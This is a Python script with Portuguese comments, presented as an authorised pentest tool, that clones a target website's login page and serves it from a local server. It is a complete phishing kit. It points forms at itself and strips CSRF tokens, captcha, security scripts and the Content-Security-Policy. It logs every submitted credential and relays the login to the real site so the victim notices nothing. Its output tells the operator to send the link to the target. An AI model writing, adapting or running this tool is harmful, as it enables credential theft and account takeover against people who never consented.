#!/usr/bin/env python3
"""
Phishing Login Cloner - Pentest Tool (Uso Autorizado Apenas)
Captura credenciais de uma página de login clonada e redireciona para a original.

Uso: python3 login_cloner.py <url_alvo>
Exemplo: python3 login_cloner.py https://example.com/login
"""

import sys
import re
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
import argparse
import logging

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')
log = logging.getLogger(__name__)

# Configurações
LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 8080
CAPTURED_CREDS = []  # Armazena credenciais capturadas

class RequestHandler(BaseHTTPRequestHandler):
    """Handler HTTP que serve a página clonada e captura credenciais."""
    
    target_url = None
    original_form_action = None
    login_page_content = None
    login_page_url = None
    
    def do_GET(self):
        """Serve a página de login clonada."""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.login_page_content.encode('utf-8'))
            log.info(f"[+] Página de login servida para {self.client_address[0]}")
        else:
            # Tenta servir recursos estáticos da página original
            self.proxy_request()
    
    def do_POST(self):
        """Captura credenciais do formulário de login."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Extrai e exibe credenciais
        parsed_data = parse_qs(post_data)
        creds = {k: v[0] for k, v in parsed_data.items()}
        
        log.info("=" * 60)
        log.info("[+] CREDENCIAIS CAPTURADAS!")
        log.info(f"[+] Cliente: {self.client_address[0]}")
        log.info(f"[+] Timestamp: {self.log_date_time_string()}")
        log.info(f"[+] Dados do formulário:")
        for field, value in creds.items():
            log.info(f"    {field}: {value}")
        log.info("=" * 60)
        
        CAPTURED_CREDS.append({
            'client': self.client_address[0],
            'timestamp': self.log_date_time_string(),
            'credentials': creds
        })
        
        # Redireciona para a página original com os dados submetidos
        # Isso faz parecer que houve um erro e redireciona ao site real
        target = RequestHandler.target_url
        redirect_url = urljoin(target, RequestHandler.original_form_action or target)
        
        # Se a página original espera POST, faz uma requisição POST em nome do usuário
        # e retorna o resultado (login bem-sucedido no site real)
        try:
            # Faz o POST real no site alvo para autenticar
            session = requests.Session()
            
            # Copia headers relevantes
            headers = {
                'User-Agent': self.headers.get('User-Agent', 'Mozilla/5.0'),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': redirect_url,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': self.headers.get('Accept-Language', 'en-US,en;q=0.5'),
            }
            
            # Obtém cookies da página original primeiro
            session.get(target, headers=headers, timeout=10)
            
            # Submete o login real
            resp = session.post(redirect_url, data=parsed_data, headers=headers, 
                              allow_redirects=True, timeout=10)
            
            # Retorna a resposta para o cliente (login bem-sucedido aparente)
            self.send_response(resp.status_code)
            
            # Copia headers de resposta relevantes
            for h, v in resp.headers.items():
                if h.lower() in ('content-type', 'location', 'set-cookie', 'cache-control', 'expires'):
                    self.send_header(h, v)
            
            # Se houve redirect, segue
            if resp.history:
                self.send_header('Location', resp.url)
            
            self.end_headers()
            self.wfile.write(resp.content)
            
            log.info(f"[+] Requisição de login reenviada para {redirect_url}")
            log.info(f"[+] Status code: {resp.status_code}")
            
        except Exception as e:
            # Fallback: redireciona simplesmente
            log.warning(f"[-] Erro ao reenviar login: {e}")
            self.send_response(302)
            self.send_header('Location', target)
            self.end_headers()
    
    def proxy_request(self):
        """Proxy para recursos estáticos (CSS, JS, imagens) da página original."""
        try:
            asset_url = urljoin(RequestHandler.login_page_url, self.path)
            resp = requests.get(asset_url, headers={'User-Agent': 'Mozilla/5.0'}, 
                              timeout=10, stream=True)
            
            self.send_response(resp.status_code)
            # Preserva content-type
            ct = resp.headers.get('Content-Type', 'application/octet-stream')
            self.send_header('Content-Type', ct)
            self.end_headers()
            
            for chunk in resp.iter_content(chunk_size=8192):
                if chunk:
                    self.wfile.write(chunk)
        except:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Silencia logs padrão do servidor."""
        pass


def clone_login_page(target_url):
    """Extrai e modifica a página de login do alvo."""
    log.info(f"[*] Baixando página de login: {target_url}")
    
    try:
        resp = requests.get(target_url, timeout=15, 
                          headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'})
        resp.raise_for_status()
    except Exception as e:
        log.error(f"[-] Falha ao acessar URL: {e}")
        sys.exit(1)
    
    # Parseia HTML
    soup = BeautifulSoup(resp.text, 'html.parser')
    
    # Encontra formulários e modifica action para nosso servidor
    forms = soup.find_all('form')
    if not forms:
        log.warning("[-] Nenhum formulário encontrado na página!")
        log.info("[*] Continuando mesmo assim...")
    
    for form in forms:
        # Salva action original para redirecionamento
        original_action = form.get('action', '')
        RequestHandler.original_form_action = original_action
        
        # Modifica action para nosso servidor (POST vai para nós)
        form['action'] = '/'
        form['method'] = 'post'
        
        log.info(f"[*] Formulário encontrado - action original: {original_action}")
    
    # Remove scripts de proteção anti-phishing
    for script in soup.find_all('script'):
        script_text = script.string or ''
        if any(kw in script_text.lower() for kw in ['csrf', 'token', 'captcha', 'recaptcha', 
                                                      'honeypot', 'fingerprint', 'security']):
            log.info(f"[!] Script de segurança removido: {script_text[:50]}...")
            script.decompose()
    
    # Remove inputs hidden com tokens CSRF
    for inp in soup.find_all('input', type='hidden'):
        name = inp.get('name', '').lower()
        if any(kw in name for kw in ['csrf', 'token', 'authenticity', '_wpnonce', 
                                       'xsrf', 'nonce', 'state']):
            log.info(f"[!] Campo de segurança removido: {inp.get('name')}")
            inp.decompose()
    
    # Remove proteção contra clickjacking no meta
    for meta in soup.find_all('meta'):
        http_equiv = meta.get('http-equiv', '').lower()
        if http_equiv == 'content-security-policy':
            log.info("[!] Content-Security-Policy removida")
            meta.decompose()
    
    modified_html = str(soup)
    
    # Corrige links relativos para absolutos
    base_url = target_url
    modified_html = re.sub(
        r'(src|href|action)=(["\'])(?!http|/|#|javascript)([^"\']+)(["\'])',
        lambda m: f'{m.group(1)}={m.group(2)}{urljoin(base_url, m.group(3))}{m.group(4)}',
        modified_html
    )
    
    RequestHandler.login_page_content = modified_html
    RequestHandler.login_page_url = target_url
    RequestHandler.target_url = target_url
    
    log.info(f"[+] Página de login clonada com sucesso!")
    log.info(f"[+] {len(forms)} formulário(s) preparado(s) para captura")


def run_server():
    """Inicia o servidor HTTP."""
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), RequestHandler)
    log.info(f"[*] Servidor de phishing rodando em http://{LISTEN_HOST}:{LISTEN_PORT}")
    log.info(f"[*] Alvo: {RequestHandler.target_url}")
    log.info(f"[*] Envie o link para o alvo ou aponte o navegador para http://SEU_IP:{LISTEN_PORT}")
    log.info(f"[*] Pressione Ctrl+C para parar")
    log.info("-" * 60)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("\n[*] Servidor encerrado.")
    
    # Exibe resumo ao final
    if CAPTURED_CREDS:
        log.info("=" * 60)
        log.info("[!] RESUMO DAS CREDENCIAIS CAPTURADAS:")
        log.info("=" * 60)
        for i, entry in enumerate(CAPTURED_CREDS, 1):
            log.info(f"  #{i} - {entry['client']} @ {entry['timestamp']}")
            for k, v in entry['credentials'].items():
                log.info(f"       {k}: {v}")
    else:
        log.info("[*] Nenhuma credencial foi capturada.")


def main():
    parser = argparse.ArgumentParser(
        description='Login Page Cloner - Pentest Tool (Uso Autorizado)',
        epilog='Exemplo: python3 login_cloner.py https://example.com/login'
    )
    parser.add_argument('url', help='URL da página de login alvo')
    parser.add_argument('--port', type=int, default=8080, help='Porta do servidor (padrão: 8080)')
    parser.add_argument('--host', default='0.0.0.0', help='Host do servidor (padrão: 0.0.0.0)')
    
    args = parser.parse_args()
    
    global LISTEN_PORT, LISTEN_HOST
    LISTEN_PORT = args.port
    LISTEN_HOST = args.host
    
    # Valida URL
    if not args.url.startswith(('http://', 'https://')):
        log.error("[-] URL deve começar com http:// ou https://")
        sys.exit(1)
    
    log.info("[*] Iniciando Login Page Cloner")
    log.info(f"[*] Alvo: {args.url}")
    
    clone_login_page(args.url)
    run_server()


if __name__ == '__main__':
    main()
